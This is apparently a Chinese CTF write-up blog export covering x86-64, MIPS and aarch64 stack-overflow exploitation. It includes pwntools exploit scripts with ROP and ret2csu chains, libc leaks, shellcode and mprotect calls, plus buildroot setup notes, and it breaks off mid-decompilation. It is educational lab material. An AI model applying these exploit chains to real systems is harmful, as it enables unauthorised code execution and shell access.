<h3 id="exp-py-3"><a href="#exp-py-3" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> p:p.recv()</span><br><span class="line">rl = <span class="keyword">lambda</span> p:p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> p,x:p.recvuntil(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> p,x:p.recvn(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> p,x:p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> p,x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> p,x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> p,x,y:p.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> p,x,y:p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn1'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn1'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'f.buuoj.cn'</span>,<span class="number">20173</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leave = <span class="number">0x0000000000400bbd</span></span><br><span class="line">p_rdi = <span class="number">0x0000000000401863</span></span><br><span class="line">p_rsi_r = <span class="number">0x0000000000401861</span></span><br><span class="line">csu_front = <span class="number">0x40185A</span></span><br><span class="line">csu_end = <span class="number">0x401840</span></span><br><span class="line">ret = <span class="number">0x000000000040028c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx,rbp,r12,r13,r14,r15,retn_rbp,rr15,retn_addr)</span>:</span></span><br><span class="line">    <span class="comment">#rbx = 0</span></span><br><span class="line">    <span class="comment">#rbp = 1</span></span><br><span class="line">    <span class="comment">#r12 = func</span></span><br><span class="line">    <span class="comment">#r13 = rdx</span></span><br><span class="line">    <span class="comment">#r14 = rsi</span></span><br><span class="line">    <span class="comment">#r15d = edi</span></span><br><span class="line">    payload = p64(csu_front)</span><br><span class="line">    payload += flat([</span><br><span class="line">        rbx,rbp,r12,r13,r14,r15</span><br><span class="line">        ])</span><br><span class="line">    payload += p64(csu_end)</span><br><span class="line">    payload += <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span></span><br><span class="line">    payload += p64(retn_rbp)</span><br><span class="line">    payload += <span class="string">"/bin/sh\x00"</span>*<span class="number">3</span></span><br><span class="line">    payload += p64(rr15)</span><br><span class="line">    payload += p64(retn_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x4016b3')</span></span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    input_addr = <span class="number">0x6020C0</span></span><br><span class="line">    sh_addr = <span class="number">0x602120</span></span><br><span class="line">    payload = csu(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x602138</span>,<span class="number">0</span>,sh_addr,<span class="number">0x3b</span>,input_addr+<span class="number">0x80</span>,input_addr<span class="number">-8</span>,ret)</span><br><span class="line">    <span class="comment">#payload = payload.ljust(0x70,'a')</span></span><br><span class="line">    <span class="comment">#payload += p64(input_addr+0xa0)</span></span><br><span class="line">    payload += p64(leave)+p64(<span class="number">0x4017e7</span>)+p64(<span class="number">0x4017d0</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x98</span>,<span class="string">'b'</span>)</span><br><span class="line">    payload += p64(leave)</span><br><span class="line">    <span class="comment">#payload += "/bin/sh\x00"</span></span><br><span class="line">    payload += p64(input_addr+<span class="number">0x98</span><span class="number">-0x18</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#payload += p64(leave)</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>mips_pwn</title>
    <url>/2020/12/14/mips-pwn/</url>
    <content><![CDATA[<h1 id="mips-arm杂记"><a href="#mips-arm杂记" class="headerlink" title="mips/arm杂记"></a>mips/arm杂记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总结一下arm/mips栈溢出的基本利用思路及uClibc环境下堆利用的思路。</p>
<h2 id="安洵杯-mips-pwn"><a href="#安洵杯-mips-pwn" class="headerlink" title="安洵杯-mips_pwn"></a>安洵杯-mips_pwn</h2><h3 id="程序逻辑-amp-amp-漏洞利用"><a href="#程序逻辑-amp-amp-漏洞利用" class="headerlink" title="程序逻辑 &amp;&amp; 漏洞利用"></a>程序逻辑 &amp;&amp; 漏洞利用</h3><p>程序是mips32位-little的程序，拿qemu-mipsel-static启动，libc是拿西湖论剑的libc加载的。IDA不支持mips的反编译，因此我们用Ghidra看一下代码。看到vuln里有个栈溢出，在那之前用printf泄露出栈上残留的memcpy地址，进而泄露libc地址。vuln里栈溢出ROP。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */</span></span><br><span class="line"></span><br><span class="line"><span class="function">undefined4 <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  undefined auStack32 [<span class="number">24</span>];</span><br><span class="line">  </span><br><span class="line">  alarm(<span class="number">0x3c</span>);</span><br><span class="line">  setbuf(_stdin,(<span class="keyword">char</span> *)<span class="number">0x0</span>);</span><br><span class="line">  setbuf(_stdout,(<span class="keyword">char</span> *)<span class="number">0x0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(auStack32,<span class="number">0</span>,<span class="number">0x14</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to MIPS pwn!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What\'s your name: "</span>);</span><br><span class="line">  read(<span class="number">0</span>,auStack32,<span class="number">0x14</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello!, %s"</span>,auStack32);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  undefined auStack40 [<span class="number">32</span>];</span><br><span class="line">  </span><br><span class="line">  read(<span class="number">0</span>,auStack40,<span class="number">0x200</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>replace(“\n”,”\r\n”).format(“A”<em>344+”B”</em>10+cyclic(190)+p32(ret_addr)+p32(0x0417aa0))</p>
<h3 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h3><p>遇到的最大困难是寻找rop的gadget，我们希望调用system(“/bin/sh”)，需要控制a0寄存器，我发现似乎没有很多的lw命令是直接从栈上拷数据到a0-a4的，一般都是拷到s*寄存器，比如拷贝到s0，再使用move指令拷贝到a1寄存器这样，所以我选择使用下面这条指令找到移动到a0的sx寄存器，再找从栈上移动到sx的指令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#0x00042648 : move $v0, $zero ; move $a0, $s0 ; move $t9, $s2 ; jalr $t9</span></span><br><span class="line"><span class="comment">#0x00018154 : lw $ra, 0x24($sp) ; lw $s2, 0x20($sp) ; lw $s1, 0x1c($sp) ; lw $s0, 0x18($sp) ; jr $ra</span></span><br><span class="line">ROPgadget --binary ./lib/libc.so.0 --only <span class="string">'lw|jr'</span>  | grep  <span class="string">"s0"</span> | grep <span class="string">"s2"</span> &gt; first</span><br><span class="line">ROPgadget --binary ./lib/libc.so.0 --only <span class="string">'move|jalr'</span>  | grep  <span class="string">"a0"</span>  &gt; second</span><br></pre></td></tr></table></figure>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'mips'</span>,endian=<span class="string">'little'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./lib/libc.so.0'</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-mipsel-static"</span>, <span class="string">"-L"</span>, <span class="string">"/home/wz/Desktop/CTF/axb2019/mips_pwn"</span>, <span class="string">"./pwn2"</span>])</span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-mipsel-static"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/home/wz/Desktop/CTF/axb2019/mips_pwn"</span>, <span class="string">"./pwn2"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"183.129.189.61"</span>,<span class="number">54403</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    raw_input()</span><br><span class="line">    p.recvuntil(<span class="string">"What's your name:"</span>)</span><br><span class="line">    p.send(<span class="string">"a"</span>*<span class="number">0x14</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"a"</span>*<span class="number">0x14</span>)</span><br><span class="line">    memcpy_addr = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">    system_addr = memcpy_addr + (<span class="number">0x767a68f0</span><span class="number">-0x7677ea60</span>)</span><br><span class="line">    libc_base = system_addr - <span class="number">0x5f8f0</span></span><br><span class="line">    binsh = memcpy_addr + (<span class="number">0x00061B80</span><span class="number">-0x37a60</span>)</span><br><span class="line">    log.success(<span class="string">"system addr =&gt; "</span> + hex(system_addr))</span><br><span class="line">    log.success(<span class="string">"binsh addr =&gt; "</span> + hex(binsh))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#0x00042648 : move $v0, $zero ; move $a0, $s0 ; move $t9, $s2 ; jalr $t9</span></span><br><span class="line">    <span class="comment">#0x00018154 : lw $ra, 0x24($sp) ; lw $s2, 0x20($sp) ; lw $s1, 0x1c($sp) ; lw $s0, 0x18($sp) ; jr $ra</span></span><br><span class="line">    gadget1 = libc_base + <span class="number">0x00018154</span></span><br><span class="line">    gadget2 = libc_base + <span class="number">0x00042648</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x24</span></span><br><span class="line">    payload += p32(gadget1)</span><br><span class="line">    payload += <span class="string">'b'</span>*<span class="number">0x18</span></span><br><span class="line">    payload += p32(binsh)+p32(<span class="number">0</span>)+p32(system_addr)</span><br><span class="line">    payload += p32(gadget2)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="骇极杯-2018-babyarm"><a href="#骇极杯-2018-babyarm" class="headerlink" title="骇极杯_2018-babyarm"></a>骇极杯_2018-babyarm</h2><h3 id="程序逻辑-amp-漏洞利用"><a href="#程序逻辑-amp-漏洞利用" class="headerlink" title="程序逻辑 &amp; 漏洞利用"></a>程序逻辑 &amp; 漏洞利用</h3><p>aarch64的程序，没有开PIE，基础栈溢出。在aarch64架构下，参数寄存器为x0-x7，其中w<em>为x</em>的低32位寄存器。调用指令有BL和BLR，BLR指将下一条指令的返回地址放在x30寄存器中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main_0</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Setbuf();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Name:"</span>, <span class="number">5u</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;unk_411068, <span class="number">0x200</span>uLL);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [xsp+10h] [xbp+10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v1, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一次输入时将shellcode写入到bss上，第二次利用rop调用mprotect将bss改为可执行的地址，再跳转到sc执行。这里和mips有点像，也是要寻找将stack数据加载到寄存器的命令，aarch中没有pop指令，替代它的是ldp指令，比如<code>ldp x19,x20,[sp, #0x10]</code>就是将rsp+0x10处的16字节分别赋值给x19和x20。而诸如<code>LDP             X29, X30, [SP+var_s0],#0x40</code>的指令表示在赋值完毕之后sp的值增加0x40，这就有点类似于pop的指令。<br>这里通过<code>ROPGadget --binary ./pwn --only &#39;ldp|ret&#39;</code>并没有找到可控x0-x3的gadget，因此这里用arm下的csu来调用mprotect。</p>
<p>如下图所示，溢出之后在栈上有保存main的x29和x30的位置，覆写x30的值到csu_start，加载各种寄存器同时控制x30的值跳转到csu_end，x21为第一次输入的bss地址的某处，保存了mprotect@plt。这里我第一次尝试使用mprotect@got，但是后续会crash，原因不明，修改之后即可。再跳回到csu_start的时候调用保存在x30的sc_addr get shell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00000000004008AC loc_4008AC                              ; CODE XREF: gadget+60↓j</span><br><span class="line">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0                 MOV             X2, X22</span><br><span class="line">.text:00000000004008B4                 MOV             X1, X23</span><br><span class="line">.text:00000000004008B8                 MOV             W0, W24</span><br><span class="line">.text:00000000004008BC                 ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0                 BLR             X3</span><br><span class="line">.text:00000000004008C4                 CMP             X19, X20</span><br><span class="line">.text:00000000004008C8                 B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC loc_4008CC                              ; CODE XREF: gadget+3C↑j</span><br><span class="line">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC                 RET</span><br></pre></td></tr></table></figure>
<h3 id="exp-payload"><a href="#exp-payload" class="headerlink" title="exp.payload"></a>exp.payload</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'aarch64'</span>,endian=<span class="string">'little'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/usr/aarch64-linux-gnu/lib/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64-static"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"./pwn"</span>])</span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64-static"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"./pwn"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28946</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    raw_input()</span><br><span class="line">    p.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">    sc = asm(shellcraft.sh())</span><br><span class="line">    bss_addr = <span class="number">0x411068</span></span><br><span class="line">    csu_start = <span class="number">0x4008CC</span></span><br><span class="line">    csu_end = <span class="number">0x4008AC</span></span><br><span class="line">    payload = sc.ljust(<span class="number">0x90</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x400600</span>)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x40</span></span><br><span class="line">    payload += p64(bss_addr+<span class="number">0x90</span>)+p64(csu_start)</span><br><span class="line">    rops = flat([</span><br><span class="line">        bss_addr+<span class="number">0x400</span>,csu_end,</span><br><span class="line">        <span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">        bss_addr+<span class="number">0x90</span>,<span class="number">7</span>,</span><br><span class="line">        <span class="number">0x1000</span>,<span class="number">0x411000</span></span><br><span class="line">        ])</span><br><span class="line">    payload += rops</span><br><span class="line">    rops1 = flat([</span><br><span class="line">        bss_addr+<span class="number">0x90</span>+<span class="number">0x30</span>+<span class="number">0x30</span>,bss_addr,</span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        ])</span><br><span class="line">    payload += rops1</span><br><span class="line">    sleep(<span class="number">0.02</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="RCTF2020-mginx"><a href="#RCTF2020-mginx" class="headerlink" title="RCTF2020-mginx"></a>RCTF2020-mginx</h2><h3 id="mips64环境搭建"><a href="#mips64环境搭建" class="headerlink" title="mips64环境搭建"></a>mips64环境搭建</h3><p>由于qemu-user模拟程序总会遇到各种问题，遂决定拿buildroot搭建一套完整的mips64做题环境，这个想法也是受<code>ruan师傅</code>一篇博客的启发，由于师傅博客里只标注了几个关键的配置，我自己搭的时候还是踩了不少坑，因此发一份详细的配置及避坑指南。</p>
<p>首先再<a href="https://buildroot.org/download.html" target="_blank" rel="noopener">官网</a>上下载buildroot源码，我这里用的是buildroot-2020.08.1版本。</p>
<p>解压缩之后进入buildroot文件夹，<code>configs</code>文件夹下包含了buildroot支持的架构的config默认配置文件。我们执行<code>make qemu_mips64_malta_defconfig</code>，即可得到一个<code>mips64-big-endian</code>的默认配置文件，同时也是一个最小安装包。</p>
<p>由于做题中我们需要用到gdbserver和ncat，因此需要安装一些其他的工具。以下是比较关键的menuconfig配置选项。</p>
<ol>
<li>Target options已经设置了我们想要的格式，进去查看一下即可<img src="/2020/12/14/mips-pwn/1.png" alt></li>
<li>toolchain:需要启动WCHAR支持和c++支持，否则无法安装nmap包;需要跨架构的gdb<br><img src="/2020/12/14/mips-pwn/2.png" alt><br><img src="/2020/12/14/mips-pwn/3.png" alt></li>
<li>System Configuration：原始配置</li>
<li>Kernel:这里选择Custon version(内核版本可以查看configs里的qemu_mips64_malta_defconfig)<br><img src="/2020/12/14/mips-pwn/4.png" alt></li>
<li>Target packages：选择Show packages that are also provided by busybox(否则一些包看不到)。</li>
<li>Target packages-&gt;debugging:选择dt/fio/gdb/strace<br><img src="/2020/12/14/mips-pwn/6.png" alt></li>
<li>arget packages-&gt;Networking applications:选择netcat/nmap<br><img src="/2020/12/14/mips-pwn/7.png" alt></li>
</ol>
<p>以上是我的配置，如果找不到某项配置可以使用<code>/</code>进行搜索。</p>
<p>配置完成之后使用<code>make -j6</code>进行编译，编译主要受网络速度影响，建议挂个代理。</p>
<p>编译完了之后在./output/images目录下生成了kernel文件vmlinux、启动脚本start-qemu.sh和文件系统rootfs.ext2。</p>
<p>编辑start-qemu.h，增加端口转发，在末尾加上<code>-nic user,hostfwd=tcp::3333-:3333,hostfwd=tcp::5555-:5555</code>，启动之后进去目标目录，使用<code>ncat -vc &quot;gdbserver 0.0.0.0:5555 ./mginx&quot; -kl 0.0.0.0 3333</code>启动gdbserver，在外面先拿exp去连<code>127.0.0.1:3333</code>，之后使用<code>gdb-multiarch ./mginx</code>以及<code>target remote :5555</code>附加到进程上，进行调试，下面是调试界面。</p>
<p>btw，经过测试，peda+pwngdb去调试的话很多命令都用不了比如vmmap/stack，pwndbg好一点，最好用的是gef，所以目前我换上了gef的配置。</p>
<p><img src="/2020/12/14/mips-pwn/8.png" alt></p>
<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>程序模拟了一个http解析处理。拿ghidra看一下逻辑，发现在二次read调用计算sz时使用的sz为用户输入的sz和数据包content长度之和，缺失检查，因此构造包头中<code>Content-Length:</code>为0xfff进行栈溢出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">undefined8 <span class="title">main</span><span class="params">(undefined4 param_1,undefined8 param_2)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  undefined4 extraout_v0_hi;</span><br><span class="line">  undefined4 extraout_v0_hi_00;</span><br><span class="line">  undefined4 extraout_v0_hi_01;</span><br><span class="line">  undefined4 extraout_v0_hi_02;</span><br><span class="line">  <span class="keyword">int</span> iVar1;</span><br><span class="line">  <span class="keyword">ssize_t</span> sVar2;</span><br><span class="line">  <span class="keyword">char</span> *__haystack;</span><br><span class="line">  <span class="keyword">char</span> *__haystack_00;</span><br><span class="line">  <span class="keyword">char</span> *pcStack4288;</span><br><span class="line">  <span class="keyword">size_t</span> sStack4280;</span><br><span class="line">  <span class="keyword">char</span> *pcStack4272;</span><br><span class="line">  undefined4 auStack4240 [<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">char</span> *pcStack4232;</span><br><span class="line">  <span class="keyword">char</span> *pcStack4224;</span><br><span class="line">  undefined4 uStack4216;</span><br><span class="line">  <span class="keyword">char</span> *pcStack4208;</span><br><span class="line">  <span class="keyword">int</span> iStack4200;</span><br><span class="line">  undefined auStack4192 [<span class="number">28</span>];</span><br><span class="line">  <span class="keyword">int</span> iStack4164;</span><br><span class="line">  <span class="keyword">void</span> *pvStack4160;</span><br><span class="line">  <span class="keyword">char</span> acStack4152 [<span class="number">4104</span>];</span><br><span class="line">  undefined4 uStack48;</span><br><span class="line">  undefined8 uStack40;</span><br><span class="line">  undefined *local_18;</span><br><span class="line">  </span><br><span class="line">  local_18 = &amp;_gp;</span><br><span class="line">  uStack48 = param_1;</span><br><span class="line">  uStack40 = param_2;</span><br><span class="line">  alarm(<span class="number">0x3c</span>);</span><br><span class="line">  iVar1 = chdir(<span class="string">"/"</span>);</span><br><span class="line">  <span class="keyword">if</span> (CONCAT44(extraout_v0_hi,iVar1) != <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">"chdir"</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = setgid(<span class="number">0xffff</span>);</span><br><span class="line">  <span class="keyword">if</span> (CONCAT44(extraout_v0_hi_00,iVar1) != <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">"setgid"</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = setuid(<span class="number">0xffff</span>);</span><br><span class="line">  <span class="keyword">if</span> (CONCAT44(extraout_v0_hi_01,iVar1) != <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">"setuid"</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,(<span class="keyword">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack4152,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">LAB_1200018c4:</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    sVar2 = read(<span class="number">0</span>,acStack4152,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">if</span> (sVar2 &lt; <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pcStack4288 = strcasestr(acStack4152,<span class="string">"GET"</span>);</span><br><span class="line">    <span class="keyword">if</span> (pcStack4288 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      pcStack4288 = strcasestr(acStack4152,<span class="string">"POST"</span>);</span><br><span class="line">      <span class="keyword">if</span> (pcStack4288 == (<span class="keyword">char</span> *)<span class="number">0x0</span>) <span class="keyword">goto</span> LAB_1200018c4;</span><br><span class="line">      auStack4240[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">      pcStack4288 = pcStack4288 + <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      auStack4240[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      pcStack4288 = pcStack4288 + <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *pcStack4288 = <span class="string">'\0'</span>;</span><br><span class="line">    pcStack4224 = pcStack4288 + <span class="number">1</span>;</span><br><span class="line">    __haystack = <span class="built_in">strchr</span>(pcStack4224,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (__haystack != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      *__haystack = <span class="string">'\0'</span>;</span><br><span class="line">      __haystack = __haystack + <span class="number">1</span>;</span><br><span class="line">      __haystack_00 = <span class="built_in">strstr</span>(__haystack,<span class="string">"\r\n"</span>);</span><br><span class="line">      <span class="keyword">if</span> (__haystack != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        *__haystack_00 = <span class="string">'\0'</span>;</span><br><span class="line">        uStack4216 = <span class="number">0</span>;</span><br><span class="line">        __haystack_00 = __haystack_00 + <span class="number">2</span>;</span><br><span class="line">        pcStack4232 = __haystack;</span><br><span class="line">        __haystack = <span class="built_in">strstr</span>(__haystack_00,<span class="string">"Connection: "</span>);</span><br><span class="line">        <span class="keyword">if</span> ((__haystack != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &amp;&amp;</span><br><span class="line">           (iVar1 = strncasecmp(__haystack + <span class="number">0xc</span>,<span class="string">"keep-alive"</span>,<span class="number">10</span>),</span><br><span class="line">           CONCAT44(extraout_v0_hi_02,iVar1) == <span class="number">0</span>)) &#123;</span><br><span class="line">          uStack4216 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        iStack4200 = <span class="number">0</span>;</span><br><span class="line">        __haystack = <span class="built_in">strstr</span>(__haystack_00,<span class="string">"Content-Length: "</span>);</span><br><span class="line">        <span class="keyword">if</span> (((__haystack != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &amp;&amp; (iVar1 = atoi(__haystack + <span class="number">0x10</span>), <span class="number">0</span> &lt; iVar1)) &amp;&amp;</span><br><span class="line">           (iVar1 &lt; <span class="number">0x1000</span>)) &#123;</span><br><span 